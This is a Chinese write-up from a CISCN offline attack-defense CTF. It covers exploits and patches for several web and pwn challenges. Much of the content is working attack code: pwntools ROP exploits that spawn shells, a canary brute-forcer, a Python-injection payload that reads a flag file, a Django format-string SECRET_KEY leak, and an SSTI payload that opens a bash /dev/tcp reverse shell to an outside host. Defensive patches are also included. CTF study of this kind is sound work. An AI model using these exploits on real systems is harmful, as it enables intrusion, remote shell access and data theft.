ciscn 线下赛 Xopowo
===

# web

## 通用的邀请用户，增加余额

```
import re
import sys
import requests as req
from pyquery import PyQuery as PQ
import string
import random
import re


class WebChecker:
    def __init__(self, ip, port, csrfname = '_xsrf'):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s/' % (ip, port)
        ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        self.username = ran_str
        self.password = ran_str
        self.change_pass = 'qq'
        self.mail = ran_str+"@"+ran_str+"."+ran_str
        self.csrfname = csrfname
        self.integral = None
        self.session = req.session()

    def _generate_randstr(self, len = 10):
        return ''.join(random.sample(string.ascii_letters, len))

    def _get_uuid(self, html):
        dom = PQ(html)
        return dom('form canvas').attr('rel')

    def _get_answer(self, html):
        uuid = self._get_uuid(html)
        answer = {}
        with open('./ans/ans%s.txt' % uuid, 'r') as f:
            for line in f.readlines():
                if line != '\n':
                    ans = line.strip().split('=')
                    answer[ans[0].strip()] = ans[1].strip()
        x = random.randint(int(float(answer['ans_pos_x_1'])), int(float(answer['ans_width_x_1']) + float(answer['ans_pos_x_1'])))
        y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
        return x,y

    def _get_user_integral(self):
        res = self.session.get(self.url + 'user')
        dom = PQ(res.text)
        res = dom('div.user-info').text()
        integral = re.search('(\d+\.\d+)', res).group()
        return integral

    def _get_token(self, html):
        dom = PQ(html)
        form = dom("form")
        token = str(PQ(form)("input[name=\"%s\"]" % self.csrfname).attr("value")).strip()
        return token

    def login_test(self):
        rs = self.session.get(self.url + 'login')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        rs = self.session.post(url=self.url + 'login', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "captcha_x": x,
            "captcha_y": y
        })
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                print "[-] Login failed."
                return False
        except:
            pass
        print "[+] Login Success."
        return True
    
    def _generate_header(self):
        ip = '172.%d.%d.%d' % (random.randint(0,255),random.randint(0,255),random.randint(0,255))
        self.header= {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',
            'X-Forwarded-For':ip,
            'X-Client-Ip':ip,
        }
    
    def register_test(self, invite = ''):
        self._generate_header()
        rs = self.session.get(self.url + 'register')
        html = rs.text
        token = self._get_token(html)
        x,y = self._get_answer(html)
        
        rs = self.session.post(url=self.url + 'register', data={
            self.csrfname: token,
            "username": self.username,
            "password": self.password,
            "password_confirm": self.password,
            "mail": self.mail,
            "invite_user": 'qq',#invite,
            "captcha_x": x,
            "captcha_y": y,
        },headers=self.header)
        try:
            dom = PQ(rs.text)
            error = dom("div.alert.alert-danger")
            error = PQ(error).text().strip()
            if len(error):
                print "[-] Register failed."
                return False
        except:
            pass
        print "[+] Register Success."
        return True

def checker(ip, port, csrfname):
    try:
        check = WebChecker(str(ip), str(port), csrfname)
        check.register_test()

        print '[-] Done'
    except Exception as ex:
        return '[!] Error, Unknown Exception,' + str(ex)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Wrong Params")
        print("example: python %s %s %s %s" % (sys.argv[0], '127.0.0.1', '80', '_xsrf'))
        exit(0)
    ip = sys.argv[1]
    port = sys.argv[2]
    csrfname = sys.argv[3]
    for i in range(0xffff):
        checker(ip, port, csrfname)
```

## web1

/home/ciscn/sshop/views/Shop.py存在pickle反序列化

修改pickle为json库

```
def loads(strs):
    # reload(pickle)
    # files = StringIO(strs)
    # unpkler = pickle.Unpickler(files)
    return json.loads()
    
    

class ShopCarAddHandler(BaseHandler):
    def post(self, *args, **kwargs):
        id = self.get_argument('id')
        commodity = self.orm.query(Commodity).filter(Commodity.id == id).one()
        self.set_secure_cookie('commodity_id', id)
        name = commodity.name
        name = json.dumps(name)
        self.set_cookie('name',base64.b64encode(name))
        return self.redirect('/shopcar')
```

## web2

忘了题目了，好像是proof of work，这里有个坑，如果是字母+数字的六位字符串爆破sha256，不多线程大概四小时算出来一个。

但题目设置的是，前两位是数字，后面四位是字母加数字【未验证】，所以大概一分钟可以得出一个。总之刷够了分数，开启留言板。

最后一步：留言板提示是pickle反序列化漏洞，实际是传一个base64过的序列化过的串，并且很完美的处理了解码错误异常，所以应该怎么知道需要提交一个base64编码之后的数据？

修补：在最后的反序列化漏洞处，取消load功能，防止恶意代码执行。

## web4

购买逻辑存在时间竞争

修改SQL语句，用户减少余额时判断是否拥有足够余额。

``` php
public function pay($userid,$price)
{
    $sql = $this->prepare("UPDATE ".$this->table." SET integral= integral-?,commodityid=0,buy_count=buy_count+1 WHERE `id`=? and `integral` >= ?");
    $sql->bindValue(1, $price, \PDO::PARAM_STR);
    $sql->bindValue(2, $userid, \PDO::PARAM_STR);
    $sql->bindValue(3, $price, \PDO::PARAM_STR);
    $sql->execute();
    return $sql;
}
```

取消pay中的时间等待。

```php
if($commodityamount>=1 && $userMoney>=$commodityprice){
    //sleep(1);
    if($commoditymodel->reduceOne($commodityid) && $usermodel->pay($user['id'],$commodityprice))
```

不允许文件包含。
```php
<?php
if(empty($_GET))
{
    show_source(__FILE__); 
}else{
	//ini_set("open_basedir", "/app/F13g_hhhhhhhhhhh/:/tmp/");
    //include @$_GET['file'];
}
```

## web5

登陆之后可以在cookie中看到iv和secret字样，CBC比特翻转

代码中使用AES加密CBC分组模式，存在CBC比特翻转攻击，这里讲CBC分组模式修改为CFB分组模式

将下面代码中的aes-128-cbc修改为aes-128-cfb

```shell
/var/www/html/user/userchange.php:5:define("METHOD", "aes-128-cbc");
/var/www/html/login.php:19:define("METHOD", "aes-128-cbc");
```

/var/www/html/admin/add.php中存在SQL注入，通过addslashes对输入进行转义

```php
if(isset($_POST['name'])){
  $sqlmap_AG = "/sqlmap/i";
  if(true == preg_match($sqlmap_AG, $agent)){
    die('ERROR');
  }
        $name = addslashes($_POST['name']);
        $desc = addslashes($_POST['desc']);
        $amount = addslashes($_POST['amount']);
        $price = addslashes($_POST['price']);
        $sql="INSERT INTO `commoditys` (`name`,`descr`,`amount`,`price`) VALUES ('$name','$desc',$amount,$price)";
        $db_selected = mysql_select_db("ciscnweb233",$con);
        $result=mysql_query($sql,$con);
        $row = mysql_fetch_array($result);
        if($result)
        {
        echo '�~H~P�~J~_';
        }
        else
        {
          echo '失败�~F';
        }
}
?>
```

## web6

新疆大盘鸡真好吃ww

根据提示，先刷钱，等到购买了切糕【10000元】，买了之后，在购买记录里看到一个邮箱，利用重置功能，重置其账号密码。

得到账号密码之后可以以admin身份登录

之后发现admin比正常用户的功能中多了一个search功能，存在django格式化字符串

读取secret key

```
{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

django 1.5在已知SECRET_KEY的情况下可以通过反序列化RCE

可参考：http://www.polaris-lab.com/index.php/archives/426/

修复：

/home/ciscn/www/store/views.py 中的search功能存在Django格式化字符串漏洞

在模板渲染时`{`和`}`会影响代码语义，直接将该特殊字符替换为空字符串

```python
def search(request):
    keyword=request.GET.get("searchstr")
    coutstr= "Hello {user}, This is your search: "+request.GET.get("searchstr").replace("{","").replace("}","")
    coutstr=coutstr.format(user=request.user)
    clo_list=Clothing.objects.filter(name__icontains=keyword)
    clo_list = getPage(request, clo_list)
    return render(request, "list.html", locals())
```

## web8

首先有个JWT（和业务没啥关系的一个强行JWT）,明文部分如下

```
{"typ":"JWT","alg":"HS256"}.{"id":"81"}.
```

爆破得到HS256算法的密钥为hS25

修改id为1然后提交计算出的JWT即可得到一个URL

访问URL是一个代码审计

```
<?php 
/** 
 * Created by PhpStorm. 
 * User: MS 
 * Date: 2018/5/19 
 * Time: 11:59 
 */ 

defined('BASEPATH') OR exit('No direct script access allowed'); 
require_once APPPATH . 'libraries/REST_Controller.php'; 
use Restserver\Libraries\REST_Controller; 

class Sdlsaflholhpnklnvlk extends CI_Controller { 
    public function __construct() 
    { 
        parent::__construct(); 
    } 

    public function index() 
    { 
        @include($_GET['file']); 

        if(isset($_FILES['file']['tmp_name'])){ 
            $filename = $_FILES['file']['name']; 
            $filetype = $_FILES['file']['type']; 
            $tmpname = $_FILES['file']['tmp_name']; 
            $fileext = substr(strrchr($filename,"."),1); 
            $uploaddir = 'static/'; 
            $newimagepath = ''; 

            if(($fileext == 'gif')&&($filetype == "image/gif")) 
            { 
                $im = imagecreatefromgif($tmpname); 
                if($im) 
                { 
                    srand(time()); 
                    $newfilename = md5(rand()).".gif"; 
                    $newimagepath = $uploaddir.$newfilename; 
                    imagegif($im,$newimagepath); 
                } 
                else 
                { 
                    echo '不是合法的gif文件'; 
                } 
                unlink($tmpname); 
            }else if(($fileext == 'jpg')&&($filetype == "image/jpeg")) 
            { 
                $im = imagecreatefromjpeg($tmpname); 
                if($im) 
                { 
                    srand(time()); 
                    $newfilename = md5(rand()).".jpg"; 
                    $newimagepath = $uploaddir.$newfilename; 
                    imagejpeg($im,$newimagepath); 
                } 
                else 
                { 
                    echo '不是合法的jpg文件'; 
                } 
                unlink($tmpname); 
            }else if (($fileext=='png')&&($filetype=="image/png")) 
            { 
                $im = imagecreatefrompng($tmpname); 
                if($im) 
                { 
                    srand(time()); 
                    $newfilename = md5(rand()).".png"; 
                    $newimagepath = $uploaddir.$newfilename; 
                    imagepng($im,$newimagepath); 
                } 
                else 
                { 
                    echo '不是合法的png文件'; 
                } 
                unlink($tmpname); 
            }else 
            { 
                echo '只能上传图片文件'; 
                unlink($tmpname); 
            } 
            if ($newimagepath) echo $newimagepath; 
        } 
        $data['file'] = highlight_file(__FILE__,true); 
        $data['token_name'] = $this->security->get_csrf_token_name(); 
        $data['token_hash'] = $this->security->get_csrf_hash(); 
        $this->load->view('Api',$data); 

    } 

} 

?>
```

上传文件然后进行包含即可getshell

fixit阶段发现web的static目录(可列目录)中其实已经包含了存在后门的gif文件，直接包含这些文件即可getshell

修复：

删除已有后门gif。
* 
文件包含检查包含位置，禁止包含静态文件（上传的文件）

```php
if (strpos($_GET['file'],'static/') === false){
    @include($_GET['file']);
}
```

## web10

邀请用户注册，可以获得奖励，奖励买gift，可以获得经验值，经验值达到要求，可以在页面中得到flag。

修复方案：
- 添加邀请对象的时候，超过300人，不可以再邀请。
- 区块链漏洞修复
```python
if inviteUser.invite_num <= 300:
    #邀请对象增加
```


# pwn

## pwn1
在主函数的case2和case3中存在stack over flow
```c
case 2:
        hostlong = htonl(hostlong);
        memset(&s, 0, 0xC8uLL);
        read(0, &s, (signed int)hostlong);

case 3:
        hostlong = ntohl(hostlong);
        read(0, &s, (signed int)hostlong);
        read(0, &expr_length, 4uLL);
        expr_length = htonl(expr_length);
        memset(v12, 0, expr_length + 1);
        read(0, v12, expr_length);
```
payload:
```python
from pwn import *
import time
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

def exp(addr, arg1, arg2, arg3):
	popaddr = 0x0405D3A
	calladdr = 0x0405D20
	shellcode = p64(popaddr) + p64(0) + p64(1) + p64(addr) + p64(arg3) + p64(arg2) + p64(arg1) + p64(calladdr)
	shellcode += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
	return shellcode

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./main_patch', env = {'LD_PRELOAD' : './libc.so.6'})
		gdb.attach(p, 'b *0x04021F2\nc')
	else:
		p = remote(ip, port)
	libc = ELF('./libc.so.6')
	new_stack = 0x00609000 + 0xa00

	shellcode = p32(0)
	shellcode += p32(1)[ : : -1]
	shellcode += p32(3)[ : : -1]
	shellcode += p32(2)[ : : -1]
	shellcode += '0\x00'
	shellcode += p32(0x1000)[ : : -1]
	shellcode += '\x00' * 0xf0
	shellcode += p64(new_stack) + exp(0x06090F0, 1, 0x06090F0, 0x8) + p64(0x0401E39)

	p.send(shellcode)
	time.sleep(0.1)

	p.send(p32(309)[ : : -1] + 'hack by w1tcher')
	time.sleep(0.1)
	libc.address = u64(p.recvn(8)) - libc.symbols['write']
	log.info('libc addr is : ' + hex(libc.address))

	shellcode = p32(0)
	shellcode += p32(1)[ : : -1]
	shellcode += p32(3)[ : : -1]
	shellcode += p32(2)[ : : -1]
	shellcode += '0\x00'
	shellcode += p32(0x1000)[ : : -1]
	shellcode += '\x00' * 0xf0
	shellcode += p64(new_stack) 
	shellcode += p64(0x0405d43) + p64(next(libc.search('/bin/sh'))) + p64(libc.symbols['system'])

	p.send(shellcode)
	time.sleep(0.1)

	p.send(p32(309)[ : : -1] + 'hack by w1tcher')
	time.sleep(0.1)

	p.interactive()

if __name__ == '__main__':
	GameStart('172.16.6.101', 1337, 1)
```
在其中可以从逻辑中得出s的长度为0xc8，v12的长度为0x134故所以hook 0x0401FDC，0x04021CF，0x0402213这三处的地址，然后添加check函数，检测输入长度是否合法，不合法，返回最大值:
``` c
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <dlfcn.h>
#include <stdlib.h>

#ifdef __x86_64__

#define SYS_READ "0"
#define SYS_WRITE "1"
#define SYS_OPEN "2"

#define SYS_GETPID "0x27"

#define POINTER uint64_t
#else

#define SYS_READ "3"
#define SYS_WRITE "4"
#define SYS_OPEN "5"

#define SYS_GETPID "0x14"

#define POINTER uint32_t
#endif

#define BUFSIZE 1024

typedef void* (*FUNC_dlopen)(const char *, int);
typedef void* (*FUNC_dlsym)(void *, char*);
typedef void* (*FUNC_printf)(void *, ...);
typedef void* (*FUNC_hook)(void *, ...);

void * check(uint32_t hlen){
    FUNC_hook htonl = 0x400FA0;
    uint32_t len = htonl(hlen);
    if(len > 0xc8){
        len = 0xc8;
    }
    return len;
}

void * check2(uint32_t hlen){
    FUNC_hook htonl = 0x400FA0;
    uint32_t len = htonl(hlen);
    if(len > 0x134){
        len = 0x134;
    }
    return len;
}
```
这里使用的是python的lief库来做文件的hook：

```python
import pwn
import lief

def hookgot(binary, hook, virtual_addr, gotname, hookname):
    hookfuc = hook.get_symbol(hookname)
    binary.patch_pltgot(gotname, virtual_addr + hookfuc.value)

def patch(binary, binaryaddr, hookaddr):
    binary.patch_address(binaryaddr, [0xe8] + [ord(i) for i in pwn.p32((hookaddr - binaryaddr - 5 + 2**32) % 2**23)])

if __name__ == '__main__':
    hookfuclist=[]
    hookfuclist.append([0x0401FDC ,'check'])
    hookfuclist.append([0x04021CF ,'check'])
    hookfuclist.append([0x0402213 ,'check2'])

    binaryname = './main'
    hookbinaryname = './hook'

    binary = lief.parse(binaryname)
    hook = lief.parse(hookbinaryname)
    segment_add = binary.add(hook.segments[0])

    for addr,name in hookfuclist:
        patch(binary, addr, segment_add.virtual_address + (hook.get_symbol(name)).value)

    binary.write(binaryname + '_patch')

```
这样就可以修补漏洞了。

## pwn2
在unsigned __int64 __fastcall play(int a1)函数中存在一个明显的栈溢出和内存读取问题，可读取canary并覆盖返回地址。
并且在题目中已经给了libc的地址，所以很容易可以利用栈溢出来获得执行ROP的能力。
但由于题目是用socket+fork来执行的，即使执行了system('/bin/sh')，它的输入输出也依旧绑在stdin和stdout上。
此时，可以利用dup2函数将输入输出重定向到本链接的socket上，再执行system("/bin/sh")，就可以拿到shell了。
EXP:
```
#coding:utf-8
from ctypes import *
from pwn import *
import time
debug=0
elf = ELF('./chall')
if debug:
	p= remote('127.0.0.1',1337)
	context.log_level = 'debug'
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

else:
	p= remote('172.16.6.102',1337)
	context.log_level = 'debug'
	libc = ELF('./libc.so.6')
	#gdb.attach(p,'b *0x400e1b\n')
p.send('RPCM')
p.send('\x00\x00\x00\xff')
p.send('\x00\x00\x00\x00')
p.send('\xff\xff\xff\xff')
p.recvuntil('>')
p.send('1')
p.recvuntil('0x')
libc.address = int('0x'+p.recvline()[:-1],16)+1280-libc.symbols['puts']
print "[+] system",hex(libc.symbols['system'])
p.recvuntil(">")
p.send('2')
p.recvuntil('>')
p.send('a'*0x138)
p.recvuntil('a'*0x138)
canary = p.recv(8)
p.recvuntil(">")
p.send('2')
p.recvuntil('>')
p.send('a'*0x138+canary +p64(0x0000000000409be3)*2 + p64(4) + p64(0x0000000000409be1) + p64(0)*2 +p64(libc.symbols['dup2'])+p64(0x0000000000409be3) + p64(4) + p64(0x0000000000409be1) + p64(1)*2 +p64(libc.symbols['dup2']) +p64(0x0000000000409be3) +p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system']) )
p.interactive()
#0x0000000000409be3 : pop rdi ; ret
#0x0000000000409be1 : pop rsi ; pop r15 ; ret

```

修复方案：
- 在读取和输入时加以限制，使之不超过栈分配大小0x138
```
.text:0000000000401D56                 lea     rcx, [rbp+s]
.text:0000000000401D5D                 mov     eax, [rbp+fd]
.text:0000000000401D63                 mov     edx, 138h       ; nbytes  -*patched here*- 
.text:0000000000401D68                 mov     rsi, rcx        ; buf
.text:0000000000401D6B                 mov     edi, eax        ; fd
.text:0000000000401D6D                 call    _read
.text:0000000000401D72                 lea     rcx, [rbp+s]
.text:0000000000401D79                 mov     eax, [rbp+fd]
.text:0000000000401D7F                 mov     edx, 138h       ; n   -*patched here*--
.text:0000000000401D84                 mov     rsi, rcx        ; buf
.text:0000000000401D87                 mov     edi, eax        ; fd
.text:0000000000401D89                 call    _write
```

## pwn4
这题里面有个python注入漏洞
```c
sprintf(byte_605AC0, "python -c \"print eval('%s')\"", qword_605AA8);
```
payload:
```python
from pwn import *

def GameStart(ip, port, debug):
	if debug == 1:
		p = process('./pwn_patch')
		gdb.attach(p, 'b *0x00403AC9\nc')
	else:
		p = remote(ip, port)

	shellcode = p32(0)
	shellcode += p32(0)
	shellcode += p32(3)[ : : -1]
	shellcode += p32(0)[ : : -1]
	shellcode += p32(0)[ : : -1]

	shellcode += p32(0x50)[ : : -1]
	shellcode += '1");import os,sys;sys.stderr.write(open("/home/ciscn/flag", "rb").read());#'
	p.send(shellcode)

	p.interactive()

if __name__ == '__main__':
	GameStart('172.16.6.104', 1337, 1)
```
这里patch就是修改memcpy函数，hook memcpy函数，利用自己实现的函数，在'和"之前加上\这样就可以防止注入了：
```c
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <dlfcn.h>
#include <stdlib.h>

#ifdef __x86_64__

#define SYS_READ "0"
#define SYS_WRITE "1"
#define SYS_OPEN "2"

#define SYS_GETPID "0x27"

#define POINTER uint64_t
#else

#define SYS_READ "3"
#define SYS_WRITE "4"
#define SYS_OPEN "5"

#define SYS_GETPID "0x14"

#define POINTER uint32_t
#endif

#define BUFSIZE 1024

typedef void* (*FUNC_dlopen)(const char *, int);
typedef void* (*FUNC_dlsym)(void *, char*);
typedef void* (*FUNC_printf)(void *, ...);
typedef void* (*FUNC_hook)(void *, ...);

void * check(unsigned char * dest, unsigned char * src, size_t len){
    size_t sindex = 0;
    size_t dindex = 0;
    for(sindex = 0, dindex = 0; sindex < len; sindex++, dindex++){
        if(src[sindex] == '\\'){
            dest[dindex] = src[sindex];
            if(sindex + 1 >= len){
                break;
            }
            sindex++;
            dindex++;
            dest[dindex] = src[sindex];
            continue;
        }
        if(src[sindex] == '\'' || src[sindex] == '\"'){
            dest[dindex] = '\\';
            dindex++;
        }
        dest[dindex] = src[sindex];
    }
    return len;
}
```
这里使用python的lief库来做文件的hook：
```python
import pwn
import lief

def hookgot(binary, hook, virtual_addr, gotname, hookname):
    hookfuc = hook.get_symbol(hookname)
    binary.patch_pltgot(gotname, virtual_addr + hookfuc.value)

def patch(binary, binaryaddr, hookaddr):
    binary.patch_address(binaryaddr, [0xe8] + [ord(i) for i in pwn.p32((hookaddr - binaryaddr - 5 + 2**32) % 2**23)])

if __name__ == '__main__':
    hookfuclist=[]
    hookfuclist.append([0x403A5D ,'check'])

    binaryname = './pwn'
    hookbinaryname = './hook'

    binary = lief.parse(binaryname)
    hook = lief.parse(hookbinaryname)
    segment_add = binary.add(hook.segments[0])

    for addr,name in hookfuclist:
        patch(binary, addr, segment_add.virtual_address + (hook.get_symbol(name)).value)

    binary.write(binaryname + '_patch')
```

# Day 2

## web7

限制可上传文件格式与路径，只允许图片文件上传，并注释与业务逻辑无关的yaml解析代码。

其实这题是通过上传py文件覆盖源码做的，因为题目server是django开发用内置server，在文件修改后会自动加载，所以可以这么来getshell

```python
file_name = os.path.basename(meta['filename'])
if os.path.splitext(file_name)[1][1:] not in ['jpg', 'jpeg', 'png', 'gif', 'bmp'] :
    print "Only JPG PNG GIF BMP are allowed!"
    self.redirect('/user')
else:
    print file_name
    with open(file_name, 'wb') as up:
        up.write(meta['body'])
'''
if (os.path.splitext(file_name)[1][1:] == 'yml'):
    f = os.path.abspath(file_name)
    flag=yaml.load(file(f,'r'))
    self.render('upload.html',flag=flag)
else:
    print self.redirect('/user')
'''
```

## web3、web9

均存在模板注入, 404处理逻辑存在模板注入

```
GET /{{501198*500347}}/reset HTTP/1.1
Referer: http://172.16.6.107:8233
Cookie: _xsrf=2|abc7e186|0775d8233ccc760478e82ec426737ac7|1529803374; commodity_id="2|1:0|10:1529803377|12:commodity_id|4:MTU3|f047d3cf3f21ecfb2da01a111d819ecf60c86ceb1c9a223adb21a92bb3dadc44"
Host: 172.16.6.107:8233
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
```
其中一题加入了过滤
payload：
```
http://172.16.6.113:8233/{{ ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/172.16.6.6/9999 0>&1"') }}/reset
```

## pwn3

这题在eval中存在栈溢出，由于程序fork出的，所以可以爆破canary，然后直接rop拿flag，所以patch的时候，需要防止栈溢出，在调用eval函数的时候进行长度检测：

```c
__int64 __fastcall eval(const void *a1, size_t a2)
{
  __int64 result; // rax
  char *v3; // rax
  __int64 v4; // ST20_8
  __int64 v5; // [rsp+18h] [rbp-1C8h]
  __int64 v6; // [rsp+30h] [rbp-1B0h]
  __int64 v7; // [rsp+38h] [rbp-1A8h]
  char v8[8]; // [rsp+40h] [rbp-1A0h]
  char v9; // [rsp+4Ah] [rbp-196h]
  unsigned __int64 v10; // [rsp+1D8h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  memset(v8, 0, 0x190uLL);
  strcpy(v8, "res = str(");
  // buf over flow
  memcpy(&v9, a1, a2);
  if ( (unsigned int)is_allow((__int64)a1, a2) )
  {
    v8[a2 + 10] = 0;
    v3 = &v8[strlen(v8)];
    *(_QWORD *)v3 = 'edocne.)';
    *((_QWORD *)v3 + 1) = '\'iicsa\'(';
    *((_WORD *)v3 + 8) = ')';
    printf("[*] exec : %s\n", v8, a2);
    Py_Initialize();
    v5 = PyImport_AddModule((__int64)"__main__");
    v4 = PyModule_GetDict(v5);
    PyRun_StringFlags((__int64)v8, 256LL, v4, v4, 0LL);
    v6 = PyObject_GetAttrString(v5, "res");
    if ( v6 )
    {
      v7 = PyBytes_AsString(v6);
      Py_Finalize(v6, "res");
      result = v7;
    }
    else
    {
      Py_Finalize(v5, "res");
      result = 0LL;
    }
  }
  else
  {
    puts("[*] not allow!");
    result = 0LL;
  }
  return result;
}
```

payload:
```python
from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'

def GetCanary(p, f, c):
	shellcode = p32(0x4D435052)
	shellcode += p32(0)[ : : -1]
	shellcode += p32(1)[ : : -1]
	p.send(shellcode)
	p.recvn(20)

	shellcode = p32(0x4D435052)
	shellcode += p32(0)[ : : -1]
	shellcode += p32(3)[ : : -1]

	shellcode += p32(3)[ : : -1]
	shellcode += p32(0)[ : : -1]

	shellcode += p32(0)[ : : -1]
	shellcode += p32(0x18e + len(f) + 1)[ : : -1]
	shellcode += 'A' * 0x18e + f + c
	p.send(shellcode)
	p.recvn(12)

def BCanary(ip, port):
	canary = '\x00'
	for i in range(7):
		for j in range(256):
			try:
				p = remote(ip, port)
				GetCanary(p, canary, chr(j))
				p.close()
				canary = canary + chr(j)
				break
			except Exception as e:
				# raise e
				p.close()
	log.info('canary is :' + hex(u64(canary)))

	return u64(canary)

def exp(addr, arg1, arg2, arg3):
	popaddr = 0x4048EA
	calladdr = 0x4048D0
	shellcode = p64(popaddr) + p64(0) + p64(1) + p64(addr) + p64(arg3) + p64(arg2) + p64(arg1) + p64(calladdr)
	shellcode += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
	return shellcode

def GameStart(ip, port, canary):
	p = remote(ip, port)
	shellcode = p32(0x4D435052)
	shellcode += p32(0)[ : : -1]
	shellcode += p32(1)[ : : -1]
	p.send(shellcode)
	p.recvn(20)

	sc = p64(0) + exp(0x0607068, 4, 0x607A60, 0x100)

	shellcode = p32(0x4D435052)
	shellcode += p32(0)[ : : -1]
	shellcode += p32(3)[ : : -1]

	shellcode += p32(3)[ : : -1]
	shellcode += p32(0)[ : : -1]

	shellcode += p32(0)[ : : -1]
	shellcode += p32(0x18e + 8 + len(sc))[ : : -1]
	shellcode += 'A' * 0x18e + p64(canary) + sc
	p.send(shellcode)
	p.interactive()

if __name__ == '__main__':
	GameStart('172.16.6.103', 1337, BCanary('172.16.6.103', 1337))

```

根据栈帧分配可以看到，v8的栈空间大小为408，经过计算减去头（"res = str("），减去尾（").encode('ascii')\x00"）一共28个字节，所以这里判断，当输入字符长度超过380的时候，按照380来算，当不足380的时候，按照输入的来算：

```c
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <dlfcn.h>
#include <stdlib.h>

#ifdef __x86_64__

#define SYS_READ "0"
#define SYS_WRITE "1"
#define SYS_OPEN "2"

#define SYS_GETPID "0x27"

#define POINTER uint64_t
#else

#define SYS_READ "3"
#define SYS_WRITE "4"
#define SYS_OPEN "5"

#define SYS_GETPID "0x14"

#define POINTER uint32_t
#endif

#define BUFSIZE 1024

typedef void* (*FUNC_dlopen)(const char *, int);
typedef void* (*FUNC_dlsym)(void *, char*);
typedef void* (*FUNC_printf)(void *, ...);
typedef void* (*FUNC_hook)(void *, ...);

void * check(char * src, size_t len){
    FUNC_hook eval = 0x40469C;
    if(len > 380){
        eval(src, 380);
    }else{
        eval(src, len);
    }
    return len;
}

```

python的lief脚本为：

```python
import pwn
import lief

def hookgot(binary, hook, virtual_addr, gotname, hookname):
    hookfuc = hook.get_symbol(hookname)
    binary.patch_pltgot(gotname, virtual_addr + hookfuc.value)

def patch(binary, binaryaddr, hookaddr):
    binary.patch_address(binaryaddr, [0xe8] + [ord(i) for i in pwn.p32((hookaddr - binaryaddr - 5 + 2**32) % 2**23)])

if __name__ == '__main__':
    hookfuclist=[]
    hookfuclist.append([0x0401F95 ,'check'])

    binaryname = './main'
    hookbinaryname = './hook'

    binary = lief.parse(binaryname)
    hook = lief.parse(hookbinaryname)
    segment_add = binary.add(hook.segments[0])

    for addr,name in hookfuclist:
        patch(binary, addr, segment_add.virtual_address + (hook.get_symbol(name)).value)

    binary.write(binaryname + '_patch')

```
